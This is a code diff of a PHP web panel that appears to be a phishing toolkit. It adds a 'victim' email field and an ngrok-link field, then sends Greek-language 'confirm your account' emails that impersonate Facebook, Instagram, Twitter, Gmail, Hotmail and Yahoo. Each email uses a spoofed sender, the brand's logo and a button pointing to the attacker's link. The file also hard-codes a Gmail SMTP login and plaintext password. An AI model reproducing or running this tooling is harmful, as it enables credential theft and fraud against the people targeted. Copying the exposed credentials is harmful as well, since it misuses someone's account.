@@ -73,16 +73,21 @@ transform: scale(2);
 
          <form action="" method="post">
 
+          <!--
          <input type="radio" name="email_net" value="Lan" checked required> Lan
          &nbsp; &nbsp; &nbsp; 
       <input type="radio" name="email_net" value="Wan"> Wan
+         --> 
 
-           <br><br>
 
   <font color="black">  < </font>
      <input type="email" name="email" id="email" maxlength="64" placeholder="Email to victim"  required> 
       <font color="black"> > </font>
  
+      <font color="black">  < </font>
+     <input type="text" name="ngrok" id="ngrok" maxlength="64" placeholder="Ngrok link"  required> 
+      <font color="black"> > </font>
+
              <br><br> 
 
     <input type="submit" name="submit_email_phishing" value="Email Phishing" id="submit">
@@ -350,14 +355,13 @@ transform: scale(2);
 
 
 
-  echo "<script type='text/javascript'>alert('Fake dns for $fake_dns generated');
-         </script>";
+  //echo "<script type='text/javascript'>alert('Fake dns for $fake_dns generated');
+       //  </script>";
           echo ("<script>location.href='/'</script>");
          } 
  
 
        } // end of submit dns
-
 
 
 
@@ -372,28 +376,30 @@ transform: scale(2);
      if (isset($_POST['submit_email_phishing']))
          {
  
-        $email_net =  $obj_dns-> SAFE_DATA_ENTER($_POST['email_net']);
+       // $email_net =  $obj_dns-> SAFE_DATA_ENTER($_POST['email_net']);
         $email     =  $obj_dns-> SAFE_DATA_ENTER($_POST['email']);
+        $ngrok     =  $obj_dns-> SAFE_DATA_ENTER($_POST['ngrok']);
 
-        $ipv4_mail = trim(shell_exec('shell/./my_ipv4.sh'));
 
-        $PublicIP_mail = trim(shell_exec("shell/./my_public_ip.sh")); 
+        //$ipv4_mail = trim(shell_exec('shell/./my_ipv4.sh'));
+
+       // $PublicIP_mail = trim(shell_exec("shell/./my_public_ip.sh")); 
 
 
 
 
               // Get network type for attack
 
-              if ($email_net == "Lan")
-               {
-                $MyIP_mail = $ipv4_mail;
-                 }
+              //if ($email_net == "Lan")
+              // {
+               // $MyIP_mail = $ipv4_mail;
+               //  }
 
 
-             else  if ($email_net == "Wan")
-                 {
-                  $MyIP_mail = $PublicIP_mail;
-                   }
+            // else  if ($email_net == "Wan")
+               //  {
+               //   $MyIP_mail = $PublicIP_mail;
+                //   }
 
 
 
@@ -415,11 +421,18 @@ transform: scale(2);
                    }
 
 
+ 
+
+ else if ($link == 'no-reply@Facebook_pc.com' or $link == 'no-reply@Facebook_tablet_mobile.com')
+        {
+
       require "/var/www/clonenew/mail/PHPMailerAutoload.php";
 
 
 
 $mail = new PHPMailer(); // create a new object
+
+$mail->CharSet = 'UTF-8';
 
 $mail->IsSMTP(); // enable SMTP
 
@@ -439,16 +452,27 @@ $mail->Username = "makindosxx@gmail.com";
 
 $mail->Password = "mak*.m02m";
 
-  $mail->SetFrom($link, $str_link4);
+$mail->SetFrom($link, $str_link4);
 
-  $mail->FromName = $str_link4;
+$mail->FromName = $str_link4;
 
 
-$mail->Subject = "Choose Password";
+$mail->AddEmbeddedImage('css/mail_pics/fb.png', 'fb');
 
-$mail->Body = "<h3> Εντοπίσαμε ύποπτη απόπειρα σύνδεσης στο λογαριασμό σας με τον κωδικό σας. <br>
-               Ασφαλείστε τον λογαριασμό σας τώρα. </h3> <br><br>
-               <a href='http://$MyIP_mail'><button> Εδώ </button></a>";
+$mail->Subject = "Επιβεβαιώστε το λογαριασμό σας στο Facebook";
+
+$mail->Body = "<h2> <img src='cid:fb' height='24' width='24'> 
+                <font color='#45569C'>
+                 Απαιτούμενη ενέργεια: Επιβεβαιώστε το λογαριασμό σας στο Facebook  
+                 </font>  
+              </h2> 
+               <br><br>
+               <a href='$ngrok' style='display: block; width: 17em; height: 1.2em; padding: 16px;
+                                                  text-align: center; border-radius: 3px; color: white;
+                                                  font-weight: bold; background:#45569C; color:white; 
+                                                  font-size: 14px; text-decoration: none'> 
+                Επιβεβαιώστε το λογαριασμό σας 
+                </a>";
              
 
 $mail->AddAddress("$email");
@@ -456,8 +480,8 @@ $mail->AddAddress("$email");
 
      if ($mail->Send()) 
         {
-       echo '<script type="text/javascript">alert("Phishing attack Successfully");
-         </script>';
+      // echo '<script type="text/javascript">alert("Phishing attack Successfully");
+        // </script>';
         echo ("<script>location.href='/'</script>");
          }
 
@@ -470,13 +494,487 @@ $mail->AddAddress("$email");
        }
 
 
+      } // end if site ready facebook
+
+
+
+
+
+
+ else if ($link == 'no-reply@Instagram.com')
+        {
+
+      require "/var/www/clonenew/mail/PHPMailerAutoload.php";
+
+
+
+$mail = new PHPMailer(); // create a new object
+
+$mail->CharSet = 'UTF-8';
+
+$mail->IsSMTP(); // enable SMTP
+
+$mail->SMTPDebug = 0; // debugging: 1 = errors and messages, 2 = messages only
+
+$mail->SMTPAuth = true; // authentication enabled
+
+$mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail
+
+$mail->Host = "smtp.gmail.com";
+
+$mail->Port = 465; // or 587
+
+$mail->IsHTML(true);
+
+$mail->Username = "makindosxx@gmail.com";
+
+$mail->Password = "mak*.m02m";
+
+$mail->SetFrom($link, $str_link4);
+
+$mail->FromName = $str_link4;
+
+
+$mail->AddEmbeddedImage('css/mail_pics/inst.png', 'inst');
+
+$mail->Subject = "Επιβεβαιώστε το λογαριασμό σας στο Instagram";
+
+$mail->Body = "<h2> <img src='cid:inst' height='24' width='24'> 
+                <font color='#EB9E6B'>
+                 Απαιτούμενη ενέργεια: Επιβεβαιώστε το λογαριασμό σας στο Instagram  
+                 </font>  
+              </h2> 
+               <br><br>
+               <a href='$ngrok' style='display: block; width: 17em; height: 1.2em; padding: 16px;
+                                                  text-align: center; border-radius: 3px; color: white;
+                                                  font-weight: bold; background:#EB9E6B; color:white; 
+                                                  font-size: 14px; text-decoration: none'> 
+                Επιβεβαιώστε το λογαριασμό σας 
+                </a>";
+             
+
+$mail->AddAddress("$email");
+
+
+     if ($mail->Send()) 
+        {
+      // echo '<script type="text/javascript">alert("Phishing attack Successfully");
+        // </script>';
+        echo ("<script>location.href='/'</script>");
+         }
+
+
+     else 
+      {
+      echo '<script type="text/javascript">alert("Phishing attack failed");
+         </script>';
+       echo ("<script>location.href='/'</script>");
+       }
+
+
+      } // end if site ready instagram
+
+
+
+
+
+
+
+else if ($link == 'no-reply@Twitter.com')
+        {
+
+      require "/var/www/clonenew/mail/PHPMailerAutoload.php";
+
+
+
+$mail = new PHPMailer(); // create a new object
+
+$mail->CharSet = 'UTF-8';
+
+$mail->IsSMTP(); // enable SMTP
+
+$mail->SMTPDebug = 0; // debugging: 1 = errors and messages, 2 = messages only
+
+$mail->SMTPAuth = true; // authentication enabled
+
+$mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail
+
+$mail->Host = "smtp.gmail.com";
+
+$mail->Port = 465; // or 587
+
+$mail->IsHTML(true);
+
+$mail->Username = "makindosxx@gmail.com";
+
+$mail->Password = "mak*.m02m";
+
+$mail->SetFrom($link, $str_link4);
+
+$mail->FromName = $str_link4;
+
+
+$mail->AddEmbeddedImage('css/mail_pics/twitt.png', 'twitt');
+
+$mail->Subject = "Επιβεβαιώστε το λογαριασμό σας στο Twitter";
+
+$mail->Body = "<h2> <img src='cid:twitt' height='24' width='24'> 
+                <font color='#65A8EC'>
+                 Απαιτούμενη ενέργεια: Επιβεβαιώστε το λογαριασμό σας στο Twitter  
+                 </font>  
+              </h2> 
+               <br><br>
+               <a href='$ngrok' style='display: block; width: 17em; height: 1.2em; padding: 16px;
+                                                  text-align: center; border-radius: 3px; color: white;
+                                                  font-weight: bold; background:#65A8EC; color:white; 
+                                                  font-size: 14px; text-decoration: none'> 
+                Επιβεβαιώστε το λογαριασμό σας 
+                </a>";
+             
+
+$mail->AddAddress("$email");
+
+
+     if ($mail->Send()) 
+        {
+      // echo '<script type="text/javascript">alert("Phishing attack Successfully");
+        // </script>';
+        echo ("<script>location.href='/'</script>");
+         }
+
+
+     else 
+      {
+      echo '<script type="text/javascript">alert("Phishing attack failed");
+         </script>';
+       echo ("<script>location.href='/'</script>");
+       }
+
+
+      } // end if site ready twitter
+
+
+
+
+
+
+
+else if ($link == 'no-reply@Gmail.com')
+        {
+
+      require "/var/www/clonenew/mail/PHPMailerAutoload.php";
+
+
+
+$mail = new PHPMailer(); // create a new object
+
+$mail->CharSet = 'UTF-8';
+
+$mail->IsSMTP(); // enable SMTP
+
+$mail->SMTPDebug = 0; // debugging: 1 = errors and messages, 2 = messages only
+
+$mail->SMTPAuth = true; // authentication enabled
+
+$mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail
+
+$mail->Host = "smtp.gmail.com";
+
+$mail->Port = 465; // or 587
+
+$mail->IsHTML(true);
+
+$mail->Username = "makindosxx@gmail.com";
+
+$mail->Password = "mak*.m02m";
+
+$mail->SetFrom($link, $str_link4);
+
+$mail->FromName = $str_link4;
+
+
+$mail->AddEmbeddedImage('css/mail_pics/gm.png', 'gm');
+
+$mail->Subject = "Επιβεβαιώστε το λογαριασμό σας στο Gmail";
+
+$mail->Body = "<h2> <img src='cid:gm' height='24' width='24'> 
+                <font color='#CA3737'>
+                 Απαιτούμενη ενέργεια: Επιβεβαιώστε το λογαριασμό σας στο Gmail  
+                 </font>  
+              </h2> 
+               <br><br>
+               <a href='$ngrok' style='display: block; width: 17em; height: 1.2em; padding: 16px;
+                                                  text-align: center; border-radius: 3px; color: white;
+                                                  font-weight: bold; background:#CA3737; color:white; 
+                                                  font-size: 14px; text-decoration: none'> 
+                Επιβεβαιώστε το λογαριασμό σας 
+                </a>";
+             
+
+$mail->AddAddress("$email");
+
+
+     if ($mail->Send()) 
+        {
+      // echo '<script type="text/javascript">alert("Phishing attack Successfully");
+        // </script>';
+        echo ("<script>location.href='/'</script>");
+         }
+
+
+     else 
+      {
+      echo '<script type="text/javascript">alert("Phishing attack failed");
+         </script>';
+       echo ("<script>location.href='/'</script>");
+       }
+
+
+      } // end if site ready gmail
+
+
+
+
+
+
+
+
+
+
+else if ($link == 'no-reply@Https://login.live.com')
+        {
+
+      require "/var/www/clonenew/mail/PHPMailerAutoload.php";
+
+
+
+$mail = new PHPMailer(); // create a new object
+
+$mail->CharSet = 'UTF-8';
+
+$mail->IsSMTP(); // enable SMTP
+
+$mail->SMTPDebug = 0; // debugging: 1 = errors and messages, 2 = messages only
+
+$mail->SMTPAuth = true; // authentication enabled
+
+$mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail
+
+$mail->Host = "smtp.gmail.com";
+
+$mail->Port = 465; // or 587
+
+$mail->IsHTML(true);
+
+$mail->Username = "makindosxx@gmail.com";
+
+$mail->Password = "mak*.m02m";
+
+$mail->SetFrom($link, $str_link4);
+
+$mail->FromName = $str_link4;
+
+
+$mail->AddEmbeddedImage('css/mail_pics/hotm.png', 'hotm');
+
+$mail->Subject = "Επιβεβαιώστε το λογαριασμό σας στο Hotmail";
+
+$mail->Body = "<h2> <img src='cid:hotm' height='24' width='24'> 
+                <font color='#006BC1'>
+                 Απαιτούμενη ενέργεια: Επιβεβαιώστε το λογαριασμό σας στο Hotmail  
+                 </font>  
+              </h2> 
+               <br><br>
+               <a href='$ngrok' style='display: block; width: 17em; height: 1.2em; padding: 16px;
+                                                  text-align: center; border-radius: 3px; color: white;
+                                                  font-weight: bold; background:#006BC1; color:white; 
+                                                  font-size: 14px; text-decoration: none'> 
+                Επιβεβαιώστε το λογαριασμό σας 
+                </a>";
+             
+
+$mail->AddAddress("$email");
+
+
+     if ($mail->Send()) 
+        {
+      // echo '<script type="text/javascript">alert("Phishing attack Successfully");
+        // </script>';
+        echo ("<script>location.href='/'</script>");
+         }
+
+
+     else 
+      {
+      echo '<script type="text/javascript">alert("Phishing attack failed");
+         </script>';
+       echo ("<script>location.href='/'</script>");
+       }
+
+
+      } // end if site ready hotmail
+
+
+
+
+
+
+
+else if ($link == 'no-reply@Yahoo.com')
+        {
+
+      require "/var/www/clonenew/mail/PHPMailerAutoload.php";
+
+
+
+$mail = new PHPMailer(); // create a new object
+
+$mail->CharSet = 'UTF-8';
+
+$mail->IsSMTP(); // enable SMTP
+
+$mail->SMTPDebug = 0; // debugging: 1 = errors and messages, 2 = messages only
+
+$mail->SMTPAuth = true; // authentication enabled
+
+$mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail
+
+$mail->Host = "smtp.gmail.com";
+
+$mail->Port = 465; // or 587
+
+$mail->IsHTML(true);
+
+$mail->Username = "makindosxx@gmail.com";
+
+$mail->Password = "mak*.m02m";
+
+$mail->SetFrom($link, $str_link4);
+
+$mail->FromName = $str_link4;
+
+
+$mail->AddEmbeddedImage('css/mail_pics/yah.png', 'yah');
+
+$mail->Subject = "Επιβεβαιώστε το λογαριασμό σας στο Yahoo";
+
+$mail->Body = "<h2> <img src='cid:yah' height='24' width='24'> 
+                <font color='#720E9E'>
+                 Απαιτούμενη ενέργεια: Επιβεβαιώστε το λογαριασμό σας στο Yahoo 
+                 </font>  
+              </h2> 
+               <br><br>
+               <a href='$ngrok' style='display: block; width: 17em; height: 1.2em; padding: 16px;
+                                                  text-align: center; border-radius: 3px; color: white;
+                                                  font-weight: bold; background:#720E9E; color:white; 
+                                                  font-size: 14px; text-decoration: none'> 
+                Επιβεβαιώστε το λογαριασμό σας 
+                </a>";
+             
+
+$mail->AddAddress("$email");
+
+
+     if ($mail->Send()) 
+        {
+      // echo '<script type="text/javascript">alert("Phishing attack Successfully");
+        // </script>';
+        echo ("<script>location.href='/'</script>");
+         }
+
+
+     else 
+      {
+      echo '<script type="text/javascript">alert("Phishing attack failed");
+         </script>';
+       echo ("<script>location.href='/'</script>");
+       }
+
+
+      } // end if site ready yahoo
+
+
+
+
+
+
+else 
+  {
+
+   require "/var/www/clonenew/mail/PHPMailerAutoload.php";
+
+
+
+$mail = new PHPMailer(); // create a new object
+
+$mail->CharSet = 'UTF-8';
+
+$mail->IsSMTP(); // enable SMTP
+
+$mail->SMTPDebug = 0; // debugging: 1 = errors and messages, 2 = messages only
+
+$mail->SMTPAuth = true; // authentication enabled
+
+$mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail
+
+$mail->Host = "smtp.gmail.com";
+
+$mail->Port = 465; // or 587
+
+$mail->IsHTML(true);
+
+$mail->Username = "makindosxx@gmail.com";
+
+$mail->Password = "mak*.m02m";
+
+$mail->SetFrom($link, $str_link4);
+
+$mail->FromName = $str_link4;
+
+
+$mail->AddEmbeddedImage('css/mail_pics/any.png', 'any');
+
+$mail->Subject = "Επιβεβαιώστε το λογαριασμό σας";
+
+$mail->Body = "<h2> <img src='cid:any' height='24' width='24'> 
+                <font color='black'>
+                 Απαιτούμενη ενέργεια: Επιβεβαιώστε το λογαριασμό σας 
+                 </font>  
+              </h2> 
+               <br><br>
+               <a href='$ngrok' style='display: block; width: 17em; height: 1.2em; padding: 16px;
+                                                  text-align: center; border-radius: 3px; color: white;
+                                                  font-weight: bold; background:grey; color:white; 
+                                                  font-size: 14px; text-decoration: none'> 
+                Επιβεβαιώστε το λογαριασμό σας 
+                </a>";
+             
+
+$mail->AddAddress("$email");
+
+
+     if ($mail->Send()) 
+        {
+      // echo '<script type="text/javascript">alert("Phishing attack Successfully");
+        // </script>';
+        echo ("<script>location.href='/'</script>");
+         }
+
+
+     else 
+      {
+      echo '<script type="text/javascript">alert("Phishing attack failed");
+         </script>';
+       echo ("<script>location.href='/'</script>");
+       }
+
+
+      } // end if site anything
+
+
+
+
     } // end isset of email phishing 
-
-
-
-
-
-
 
 
 
